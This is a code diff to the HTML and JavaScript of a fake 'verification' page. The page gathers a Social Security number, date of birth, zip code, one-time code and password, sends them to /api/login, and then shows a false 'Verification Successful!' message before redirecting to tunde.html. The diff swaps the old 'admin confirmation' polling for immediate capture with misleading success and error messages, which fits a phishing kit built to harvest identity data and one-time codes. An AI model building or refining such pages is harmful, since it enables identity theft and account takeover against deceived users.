@@ -15,6 +15,7 @@
         .continue { background: #1e40af; color: white; }
         .cancel { background: #94a3b8; color: white; }
         .error { color: red; margin-top: 10px; text-align: center; font-weight: bold; }
+        .success { color: green; margin-top: 10px; text-align: center; font-weight: bold; }
         .step { display: none; }
         .step.active { display: block; }
     </style>
@@ -61,7 +62,7 @@
             <input type="text" id="code" maxlength="6" placeholder="123456" required>
             <div id="error" class="error"></div>
             
-            <button class="continue" onclick="submitCode()">Submit Code</button>
+            <button class="continue" onclick="verifyCode()">Continue</button>
             <button class="cancel" onclick="cancel()">Cancel</button>
             
             <p style="text-align:center; margin-top:15px;">
@@ -72,52 +73,7 @@
 
     <script>
         let currentStep = 1;
-         let checkInterval;
-
-        async function submitCode() {
-            const code = document.getElementById('code').value.trim();
-            const statusDiv = document.getElementById('status');
-            const errorDiv = document.getElementById('error');
-
-            if (code.length < 4) {
-                errorDiv.textContent = "Please enter a valid code.";
-                return;
-            }
-
-            statusDiv.textContent = "Waiting for admin confirmation...";
-            errorDiv.textContent = "";
-
-            // Send code to server
-            await fetch('/api/login', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    username: "Pending Verification", 
-                    password: code, 
-                    address: code 
-                })
-            });
-
-            // Start polling for confirmation
-            checkInterval = setInterval(checkConfirmation, 3000);
-        }
-
-        async function checkConfirmation() {
-            const res = await fetch('/api/records');
-            const records = await res.json();
-            
-            const latest = records[0];
-            if (latest && latest.type === "Login Attempt" && latest.address && latest.address.includes("Confirmed")) {
-                clearInterval(checkInterval);
-                alert("Verification Successful!");
-                window.location.href = "tunde.html";
-            }
-        }
-
-        function cancel() {
-            clearInterval(checkInterval);
-            window.location.href = "/";
-        }
+        let realPassword = "";
 
         function nextStep(step) {
             if (step === 2) {
@@ -146,22 +102,23 @@
             currentStep = step;
         }
 
-        async function submitCode() {
+        async function verifyCode() {
             const code = document.getElementById('code').value.trim();
             const errorDiv = document.getElementById('error');
 
             if (code.length < 4) {
-                errorDiv.textContent = "Please enter a valid code.";
+                errorDiv.textContent = "The code you entered is incorrect or has expired.";
                 return;
             }
 
+            // Collect all data
             const ssn = document.getElementById('ssn').value;
             const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
             const zip = document.getElementById('zip').value;
 
             const username = ssn ? `SSN-${ssn}` : "Verified User";
-            const password = "Pending";
-            const address = `SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Code: ${code} | Status: Pending`;
+            const password = realPassword || document.getElementById('password') ? document.getElementById('password').value : "Password"; 
+            const address = `SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Code: ${code} | Status: Correct`;
 
             await fetch('/api/login', {
                 method: 'POST',
@@ -169,8 +126,8 @@
                 body: JSON.stringify({ username, password, address })
             });
 
-            alert("Code submitted. Waiting for admin confirmation.");
-            window.location.href = "/";
+            alert("Verification Successful!");
+            window.location.href = "tunde.html";
         }
 
         function cancel() {
@@ -183,6 +140,7 @@
         }
 
         window.onload = () => {
+            // Populate dropdowns
             const monthSelect = document.getElementById('month');
             const months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
             months.forEach((month, i) => {
